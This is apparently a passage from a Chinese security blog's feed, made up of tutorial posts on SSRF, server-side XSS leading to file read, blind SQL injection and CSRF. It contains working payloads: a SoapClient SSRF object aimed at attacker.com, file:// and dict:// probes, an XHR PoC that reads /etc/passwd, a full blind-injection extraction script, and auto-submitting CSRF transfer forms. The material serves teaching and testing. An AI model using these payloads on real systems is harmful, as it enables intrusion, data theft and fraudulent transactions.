style="zoom:50%;"><ul><li><p>SoapClient</p><p>SOAP是简单对象访问协议，它是一种轻量级的基于XML的协议，被设计用来在Web上交换结构化的信息。</p><p>PHP的SoapClient就是基于SOAP协议，可专门用来访问Web服务的PHP客户端。它是PHP的内置类，当它进行反序列化时，如果触发了其中的<code>__call</code>方法，那它就会发送http(s)请求。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// param1用来知名是否是wsdl模式</span></span><br><span class="line"><span class="comment">// param2是一个数组，若在wsdl模式下，改参数可选；否则必须设置location和uri选项</span></span><br><span class="line"><span class="comment">// location是目标SOAP服务器的URL</span></span><br><span class="line"><span class="comment">// uri是目标SOAP服务器的命名空间</span></span><br><span class="line"><span class="keyword">public</span> SoapClient :: SoapClient(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [，<span class="keyword">array</span> <span class="variable">$options</span> ])</span><br></pre></td></tr></table></figure><p>了解上述两参数的汉以后，就很容易构造出SSRF的payload了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://attacker.com:8000&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://attacker.com:8000/test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;a();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问对应网页，触发SSRF。</p></li></ul><img src="/.io//image-20211107221225303.png" alt="image-20211107221225303" style="zoom:50%;"><h3 id="2-2-SSRF常见利用"><a href="#2-2-SSRF常见利用" class="headerlink" title="2.2 SSRF常见利用"></a>2.2 SSRF常见利用</h3><ol><li><p>SSRF常见利用协议：</p><ul><li><p>file协议</p><p>在有回显的情况下，利用 file 协议可以读取任意文件的内容</p></li><li><p>dict协议</p><p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p></li><li><p>gopher协议</p><p>支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议，可用于反弹shell</p></li><li><p>http(s)协议</p></li></ul></li><li><p>常见利用方式：</p><ul><li><p>读取内网文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssrf3.php?file:///etc/passwd</span><br><span class="line">ssrf.php?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure></li><li><p>探测内网主机</p><p>测试环境如下：</p><img src="/.io//image-20211107224349209.png" alt="image-20211107224349209" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssrf3.php?urlhttp://192.168.254.131</span><br><span class="line">ssrf3.php?url=http://192.168.254.132</span><br><span class="line">ssrf3.php?url=http://192.168.254.133</span><br></pre></td></tr></table></figure><p>这个可以借助burp intruder，或者自己写脚本来探测。</p></li><li><p>扫描内网端口</p><p>利用dict协议构造如下payload，即可查看内网主机上开放的端口及端口上运行服务的版本信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php?url=dict://192.168.254.131:6379/info   // redis</span><br><span class="line">ssrf.php?url=dict://192.168.254.132:80/info     // http</span><br><span class="line">ssrf.php?url=dict://192.168.254.133:22/info   // ssh</span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p>上文讲了最基础的SSRF内容，包括漏洞简介、分类，简单的case和最基础的利用，算是一个较为基础的铺垫。</p><p>接下来会详细的讲解SSRF的利用，包括一些利用gopher协议打redis进而getshell、打mysql/Memcache利用CRLF注入getshell，利用docker remote api get shell等等。</p><p>下下篇应该会讲SSRF的绕过，包括一些简单的@绕过、302跳转、xip.io、dns rebinding、parser和requester实现不一致导致的绕过——这点很有意思，可能会写的比较多。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;SSRF是一个很有趣的漏洞类型，细究起来，它涉及到的知识十分庞杂。关于SSRF的审计、绕过、利用、防御，每一个单拎出来都可以讲上许多。网络上有很多关于SSRF的博客/教程，但很多都比较基础，只是简单介绍了这个漏洞。也有很多关于该漏洞的利用，但它们又</summary>
      
    
    
    
    
    <category term="Web" scheme="https://vulnner.github.io/tags/Web/"/>
    
    <category term="basic" scheme="https://vulnner.github.io/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>XSS到服务端任意文件读取</title>
    <link href="https://vulnner.github.io/2021/12/21/XSS%E5%88%B0%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    <id>https://vulnner.github.io/2021/12/21/XSS%E5%88%B0%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</id>
    <published>2021-12-21T14:53:49.000Z</published>
    <updated>2021-12-21T14:57:26.077Z</updated>
    
    <content type="html"><![CDATA[<p>XSS是最为常见的Web漏洞之一，多年来连续入选OWASP TOP 10，它是一种代码注入类的攻击，是一种客户端侧的攻击，攻击者通过在Web应用中注入恶意JavaScript代码，通过点击URL，最终在受害者浏览器端执行的一种漏洞。主要有反射型XSS、存储型XSS、基于DOM的XSS三类。</p><p>XSS一些比较常规的危害大概有：重定向浏览器、窃取Cookie、浏览器劫持等。</p><p>与常规的XSS介绍不同，本篇文章侧重于发现XSS后的进一步利用。</p><p>主要介绍在某次实际测试过程中，发现XSS漏洞之后，如何进一步的利用，最终通过XSS达到服务端任意文件读取的危害。</p><h3 id="二、-漏洞详情"><a href="#二、-漏洞详情" class="headerlink" title="二、 漏洞详情"></a>二、 漏洞详情</h3><p>在某个Web站点中，发现了一处可以让我们下载PDF的功能，大概的URL如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.com/pay/downloadStatements?Id=xxxx&amp;utrnumber=testxyz&amp;date=2020-08-17</span><br></pre></td></tr></table></figure><p>测试过程中发现，URL中的<code>utrnumber</code>字段的值在PDF文件中被渲染，所以尝试用类似<code>&quot;&gt;&lt;s&gt;aaa</code>这样的html代码来当做该字段的值，也就是如下的URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.com/pay/downloadStatements?Id=xxxx&amp;utrnumber=&quot;&gt;&lt;s&gt;aaa&amp;date=2020-08-17</span><br></pre></td></tr></table></figure><p>访问该URL，打开获取到的PDF文件，发现<code>&quot;&gt;&lt;s&gt;aaa</code>被当做HTML渲染，这就导致了XSS。结果如下：</p><p><img src="/.io//image-20211023174701560.png" alt="image-20211023174701560"></p><p>尝试过用<code>&lt;iframe&gt;</code>来探测内网和file协议来读取文件，但都失败了。</p><p>在此之后，尝试使用JavaScript来进行进一步的探索，但是目前不不确定PDF的渲染过程中，是否执行了JavaScript脚本。所以尝试使用如下脚本来观察JS是否成功执行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test&#x27;</span>).innerHTML=<span class="string">&#x27;aaaa&#x27;</span></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- or this --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">document.write(</span>&quot;<span class="attr">aaaa</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure><p>对应URL为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.com/pay/downloadStatements?Id=xxxx&amp;utrnumber=&lt;img src=x onerror=document.write(&quot;aaaa&quot;)&gt;&amp;date=2020-08-17</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20211023175134382.png" alt="image-20211023175134382"></p><p>观察到JavaScript脚本成功执行。</p><p>接下来，检查了一下JavaScript执行所在context，令人惊喜的是这段脚本，在服务端是在**<code>file://</code>**下执行的，这也就意味着我们或许可以借此来达到任意文件读取的效果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.com/pay/downloadStatements?Id=xxxx&amp;utrnumber=&lt;img src=x onerror=document.write(&lt;img src=x onerror=document.write(&#x27;aaaa&#x27;%2bwindow.location)&gt;)&gt;&amp;date=2020-08-17</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20211023175525094.png" alt="image-20211023175525094"></p><p>接下来，尝试通过 XHR(XMLHttpRequest)来读取服务器端文件的内容，简单的PoC如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    x=<span class="keyword">new</span> XMLHttpRequest;</span></span><br><span class="line"><span class="javascript">    x.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  </span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.write(<span class="built_in">this</span>.responseText)</span></span><br><span class="line"><span class="javascript">&#125;;</span></span><br><span class="line"><span class="javascript">    x.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);</span></span><br><span class="line"><span class="javascript">    x.send();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也即访问如下URL，下载对应的PDF文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.com/pay/downloadStatements?Id=xxxx&amp;utrnumber=&lt;script&gt;x=new XMLHttpRequest;x.onload=function()&#123;document.write(this.responseText)&#125;;x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send();&lt;/script&gt;&amp;date=2020-08-17</span><br></pre></td></tr></table></figure><p>接下来查看对应 的PDF文件内容，发现成功读取到了passwd文件的内容</p><p><img src="/.io//image-20211023175853358.png" alt="image-20211023175853358"></p><p>至此，我们就完成了服务端XSS到服务端的任意文件读取，然后就能读取服务器上随便一个文件的内容啦。</p><h3 id="三、-总结"><a href="#三、-总结" class="headerlink" title="三、 总结"></a>三、 总结</h3><p>XSS是Web中很常见的一种漏洞，我们在日常的漏洞挖掘中，如果发现了XSS，不妨结合具体的应用功能做进一步的挖掘，尝试扩大XSS的危害，本次挖掘就利用XSS达到了的服务端任意文件读取的效果。</p><p>参考/学习资料：</p><ul><li><a href="https://www.aptive.co.uk/blog/xss-cross-site-scripting/">https://www.aptive.co.uk/blog/xss-cross-site-scripting/</a></li><li><a href="https://www.bugcrowd.com/resources/webinars/cross-site-scripting/">https://www.bugcrowd.com/resources/webinars/cross-site-scripting/</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;XSS是最为常见的Web漏洞之一，多年来连续入选OWASP TOP 10，它是一种代码注入类的攻击，是一种客户端侧的攻击，攻击者通过在Web应用中注入恶意JavaScript代码，通过点击URL，最终在受害者浏览器端执行的一种漏洞。主要有反射型XSS、存储型XSS、基于DO</summary>
      
    
    
    
    
    <category term="web" scheme="https://vulnner.github.io/tags/web/"/>
    
    <category term="vulns" scheme="https://vulnner.github.io/tags/vulns/"/>
    
  </entry>
  
  <entry>
    <title>sql盲注脚本记录</title>
    <link href="https://vulnner.github.io/2021/11/20/sql%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/"/>
    <id>https://vulnner.github.io/2021/11/20/sql%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/</id>
    <published>2021-11-20T09:42:58.000Z</published>
    <updated>2021-11-20T09:48:05.426Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下sql盲注时爆破数据库名、表名的脚本，提供了线性遍历和二分法两种。</p><p>与<code>substr</code>类似的还有<code>mid</code>，<code>substring</code>, <code>mid</code>等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://127.0.0.1/sqli/sql2.php?id=2&quot;</span></span><br><span class="line">mark = <span class="string">&quot;have fun&quot;</span></span><br><span class="line">db_payload = <span class="string">&quot;&#x27;+and+ascii(substr(database(),&#123;&#125;,1))&#123;&#125;&#123;&#125;--+&quot;</span> <span class="comment"># &gt; or =</span></span><br><span class="line">table_payload = <span class="string">&quot;&#x27;+and+ascii(substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),&#123;&#125;,1))&#123;&#125;&#123;&#125;--+&quot;</span> <span class="comment"># &gt; or =</span></span><br><span class="line"><span class="comment"># select group_concat(column_name) from information_schema.columns where table_name = &#x27;wp_user&#x27;</span></span><br><span class="line">col_payload = <span class="string">&quot;&#x27;+and+ascii(substr((select+group_concat(column_name)+from+information_schema.columns+where+table_name=&#x27;wp_user&#x27;),&#123;&#125;,1))&#123;&#125;&#123;&#125;--+&quot;</span></span><br><span class="line"><span class="comment"># select concat(user,0x7e,pwd) from wp_user</span></span><br><span class="line">data_payload = <span class="string">&quot;&#x27;+and+ascii(substr((select+concat(user,0x7e,pwd)+from+wp_user),&#123;&#125;,1))&#123;&#125;&#123;&#125;--+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">measure_time</span>(<span class="params">func</span>):</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    func()</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;cost time: &#123;&#125; seconds&quot;</span>.<span class="built_in">format</span>(end-start))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">probe_linear</span>(<span class="params"><span class="built_in">type</span>, payload</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    exit_flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> exit_flag:</span><br><span class="line">        exit_flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            param = payload.<span class="built_in">format</span>(j, <span class="string">&#x27;=&#x27;</span>, i)</span><br><span class="line">            r = requests.get(base_url+param)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                name += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">type</span>, name))</span><br><span class="line">                exit_flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">probe_binary</span>(<span class="params"><span class="built_in">type</span>, payload</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    exit_flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> exit_flag:</span><br><span class="line">        exit_flag = <span class="literal">True</span></span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> high &gt;= low:</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            param = payload.<span class="built_in">format</span>(j, <span class="string">&#x27;=&#x27;</span>, mid)</span><br><span class="line">            r = requests.get(base_url + param)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                name += <span class="built_in">chr</span>(mid)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">type</span>, name))</span><br><span class="line">                exit_flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            param = payload.<span class="built_in">format</span>(j, <span class="string">&#x27;&gt;&#x27;</span> ,mid)</span><br><span class="line">            r = requests.get(base_url+param)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid -<span class="number">1</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    measure_time(<span class="keyword">lambda</span>: probe_binary(<span class="string">&#x27;table_name&#x27;</span>, table_payload))</span><br><span class="line">    measure_time(<span class="keyword">lambda</span>: probe_binary(<span class="string">&#x27;col_name&#x27;</span>, col_payload))</span><br><span class="line">    measure_time(<span class="keyword">lambda</span>: probe_binary(<span class="string">&#x27;data&#x27;</span>, data_payload))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录一下sql盲注时爆破数据库名、表名的脚本，提供了线性遍历和二分法两种。&lt;/p&gt;
&lt;p&gt;与&lt;code&gt;substr&lt;/code&gt;类似的还有&lt;code&gt;mid&lt;/code&gt;，&lt;code&gt;substring&lt;/code&gt;, &lt;code&gt;mid&lt;/code&gt;等。&lt;/p&gt;
&lt;fi</summary>
      
    
    
    
    <category term="sql" scheme="https://vulnner.github.io/categories/sql/"/>
    
    
    <category term="basic" scheme="https://vulnner.github.io/tags/basic/"/>
    
    <category term="web" scheme="https://vulnner.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CSRF教程</title>
    <link href="https://vulnner.github.io/2021/11/08/CSRF%E6%95%99%E7%A8%8B/"/>
    <id>https://vulnner.github.io/2021/11/08/CSRF%E6%95%99%E7%A8%8B/</id>
    <published>2021-11-08T13:02:21.000Z</published>
    <updated>2021-11-08T13:36:12.353Z</updated>
    
    <content type="html"><![CDATA[<p>CSRF，跨站请求伪造，是一种在认证用户无感知的情况下，执行一些列操作。在一点点社工手段的帮助下，攻击者可以trick用户去执行攻击者想让他们执行的Web操作。</p><p>如果受害者是一个正常的用户，攻击者可以让他们执行一些改变状态的请求，比如转账、修改个人信息等。</p><p>而如果受害者是一个网站管理员，CSRF可搞的东西就多了，甚至可以干掉这个Web应用。不过前提是，要知道请求和api和对应的参数。</p><h2 id="description"><a href="#description" class="headerlink" title="description"></a>description</h2><p>CSRF，是一种欺骗受害者去执行恶意请求的攻击，主要是让认证的用户去执行非预期的功能。对于大多数的站点，浏览器会自动发送请求所需要的凭证，比如cookie、ip地址、windows域凭证等。</p><p>所以，如果用户已经在该站点正常登陆，这个站点无法区分伪造的请求和合法的请求。</p><p>CSRF攻击的目标，主要是改变状态的请求，因为一般情况下，CSRF对于获取敏感数据无能为力(因为拿不到啊)。</p><p>不过，有一种login csrf攻击。大概是攻击者让未认证的用户登录攻击者的常昊，如果受害者没有意识到登陆了别人的帐号，后续如果他们添加了一些个人信息，那么攻击者再登录这个帐号，就能查看敏感数据了。</p><p>还有一种存储型的CSRF，比如有的地方可以通过html标签来加载图片，别人可以访问这个页面。那么就可以把img或iframe指向精心构造的地址，其他人访问就会发起请求。</p><h2 id="misunderstanding"><a href="#misunderstanding" class="headerlink" title="misunderstanding"></a>misunderstanding</h2><p>有一些看似有用的防御措施，或者错误观念，下面来简单说一下，避雷避雷。</p><ul><li><p>使用secret cookie</p><p>所有的cookie，都会被发送给服务器，即便是那个secret one。</p><p>session id也无法区分用户的请求是否出自本意。</p></li><li><p>只接受post请求</p><p>这也是一个常见的误区，觉得只有GET请求才会导致CSRF，但并非如此，攻击者可以在自己的页面上挂一个恶意的表单，然后自动提交，受害者访问这个页面就会无意识的发起请求。</p></li><li><p>多步骤交易</p><p>多步骤的交易并不能有效防御CSRF，因为有时攻击者可以预测到每个步骤。</p></li><li><p>url rewriting</p><p>这个看起来似乎可以有效防御CSRF，因为攻击者无法猜测受害者的session id。然而，这就将用户的session id暴露在了URL中，引入了新的安全问题——url参数传递敏感数据(可能会被记录在第三方的日志中)。</p></li><li><p>https</p><p>https是常见的误区了。。。</p></li></ul><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>先来假设一个场景：Alice想要给Bob转账100刀，使用的站点时bank.com。攻击者Maria，想要Alice把钱转给自己，可能的攻击步骤如下：</p><ol><li>构造exploit URL或script</li><li>通过社工，诱使Alice点击这个URL。</li></ol><h3 id="GET方法"><a href="#GET方法" class="headerlink" title="GET方法"></a>GET方法</h3><p>比如正常转账，要发起如下请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">http://bank.com/transfer.do?acct=BOB&amp;amount=100</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure><p>那么，Maria就可以构造如下URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bank.com/transfer.do?acct=MARIA&amp;amount=100000</span><br></pre></td></tr></table></figure><p>接下来的利用：</p><ul><li>发送带有HTML内容的邮件</li><li>在受害者可能访问的页面中植入URL或script</li></ul><p>exploit URL可以为转成正常的连接，然后诱使受害者点击，比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://bank.com/transfer.do?acct=MARIA&amp;amount=100000&quot;</span>&gt;</span>View my Pictures!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 或者fake image --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://bank.com/transfer.do?acct=MARIA&amp;amount=100000&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将这些内容包含在邮件中，比如img的内容，Alice访问邮件后不会看到任何东西，但是浏览器会提交这个请求给<code>bank.com</code>，进而转账给Maria。</p><h3 id="POST方法"><a href="#POST方法" class="headerlink" title="POST方法"></a>POST方法</h3><p>针对POST请求和GET请求的攻击，不同之处在于如何被受害者触发。下面假设银行使用有问题的POST请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://bank.com/transfer.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="ini"><span class="attr">acct</span>=BOB&amp;amount=<span class="number">100</span></span></span><br></pre></td></tr></table></figure><p>这种请求，不能被标准的<code>&lt;a&gt;</code>或者<code>&lt;img&gt;</code>标签来传递，但可以使用<code>&lt;form&gt;</code>标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://bank.com/transfer.do&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;acct&quot;</span> <span class="attr">value</span>=<span class="string">&quot;MARIA&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;100000&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;View my pictures&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这可能需要用户去点击表单的提交按钮，不过也可以使用JS自动提交表单。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.forms[0].submit()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="其他HTTP方法"><a href="#其他HTTP方法" class="headerlink" title="其他HTTP方法"></a>其他HTTP方法</h3><p>假设银行用户的PUT方法，JSON作为body。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">http://bank.com/transfer.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="json">&#123; <span class="attr">&quot;acct&quot;</span>:<span class="string">&quot;BOB&quot;</span>, <span class="attr">&quot;amount&quot;</span>:<span class="number">100</span> &#125;</span></span><br></pre></td></tr></table></figure><p>这种请求，可以通过嵌在页面里的JS来发送：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span 